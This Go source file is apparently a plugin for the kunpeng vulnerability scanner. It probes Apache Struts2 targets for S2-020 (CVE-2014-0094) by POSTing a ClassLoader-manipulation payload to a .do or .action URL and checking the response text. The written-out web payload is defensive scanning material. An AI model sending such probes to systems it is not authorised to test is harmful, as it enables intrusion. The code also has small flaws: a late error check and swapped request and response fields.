package goplugin

import (
	"net/http"
	"regexp"
	"strings"

	"github.com/opensec-cn/kunpeng/plugin"
	"github.com/opensec-cn/kunpeng/util"
)

type struts2_20 struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("struts2", &struts2_20{})
}
func (d *struts2_20) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "Struts2 s2-020 DoS attacks and ClassLoader manipulation",
		Remarks: "The default upload mechanism in Apache Struts 2 is based on Commons FileUpload version 1.3 which is vulnerable and allows DoS attacks. Additional ParametersInterceptor allows access to 'class' parameter which is directly mapped to getClass() method and allows ClassLoader manipulation.",
		Level:   0,
		Type:    "RCE",
		Author:  "wolf",
		References: plugin.References{
			URL:  "https://www.freebuf.com/articles/web/31039.html",
			CVE:  "CVE-2014-0094",
			KPID: "KP-0039",
		},
	}
	return d.info
}
func (d *struts2_20) GetResult() []plugin.Plugin {
	var result = d.result
	d.result = []plugin.Plugin{}
	return result
}
func (d *struts2_20) Check(URL string, meta plugin.TaskMeta) (b bool) {
	poc := "class[%27classLoader%27][%27jarPath%27]=1024"
	var checkURL string
	for _, url := range meta.FileList {
		if ok, _ := regexp.MatchString(`\.(do|action)$`, url); ok {
			checkURL = url
			break
		}
	}
	if checkURL == "" {
		return false
	}
	request, err := http.NewRequest("POST", checkURL, strings.NewReader(poc))
	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if err != nil {
		return false
	}
	resp, err := util.RequestDo(request, true)
	if err != nil {
		return false
	}
	if strings.Contains(resp.ResponseRaw, "No result defined for action") {
		result := d.info
		result.Response = resp.RequestRaw
		result.Request = resp.ResponseRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
